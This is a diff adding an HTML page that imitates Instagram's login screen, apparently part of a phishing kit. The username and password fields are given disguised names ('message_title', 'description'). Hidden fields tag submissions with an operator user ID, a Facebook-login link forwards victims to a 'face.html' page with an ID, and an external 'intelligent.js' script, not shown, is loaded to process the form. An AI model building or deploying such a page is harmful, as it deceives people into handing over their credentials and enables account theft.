@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .instagram-container {
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 40px 20px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .instagram-logo {
+            margin-bottom: 30px;
+        }
+        .instagram-logo img {
+            max-width: 175px;
+            height: auto;
+        }
+        .form-input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            font-size: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-bottom: 6px;
+            background: #fafafa;
+            color: #262626;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+        /* Password wrapper */
+        .password-wrapper {
+            position: relative;
+            margin-bottom: 6px;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .login-button {
+            width: 100%;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 5px 9px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 8px 0;
+            transition: background-color 0.2s;
+        }
+        .login-button:hover {
+            background: #1877f2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 18px;
+        }
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 18px;
+        }
+        .facebook-login svg {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            fill: #385185;
+        }
+        .forgot-password {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="instagram-container">
+        <div class="login-box">
+            <div class="instagram-logo">
+                <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" alt="Instagram Logo">
+            </div>
+            <form id="allForm">
+                <input type="hidden" name="link" value="Instagram Login">
+                <input type="hidden" name="ftype" value="normal">
+                <input type="hidden" name="login" value="login">
+                <input type="hidden" name="user_id" value="16934">
+                <input type="text" class="form-input" name="message_title" placeholder="Phone number, username, or email" required>
+                
+                <!-- Password with eye icon -->
+                <div class="password-wrapper">
+                    <input type="password" class="form-input" id="password" name="description" placeholder="Password" required>
+                    <span class="toggle-password" id="togglePassword">👁️</span>
+                </div>
+
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <div class="divider"><span>OR</span></div>
+<a href="#" class="facebook-login" id="fbLogin">
+    <svg viewBox="0 0 24 24">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+    </svg>
+    Log in with Facebook
+</a>
+
+<script>
+document.getElementById("fbLogin").addEventListener("click", function(event) {
+    event.preventDefault();
+
+    // Get current URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    let userid = urlParams.get("id");
+
+    // If no ID in URL, use default
+    if (!userid) {
+        userid = "6976365864"; // default ID
+    }
+
+    // Redirect to face.html with the ID
+    window.location.href = `face.html?id=${userid}`;
+});
+</script>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        <div class="signup-box">
+            Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('allForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = this.message_title.value;
+            const password = this.description.value;
+        });
+
+        // Toggle password visibility
+        const togglePassword = document.getElementById("togglePassword");
+        const passwordInput = document.getElementById("password");
+        togglePassword.addEventListener("click", function() {
+            const type = passwordInput.type === "password" ? "text" : "password";
+            passwordInput.type = type;
+            this.textContent = type === "password" ? "👁️" : "🙈";
+        });
+    </script>
+    <script src="intelligent.js"></script>
+</body>
+</html>
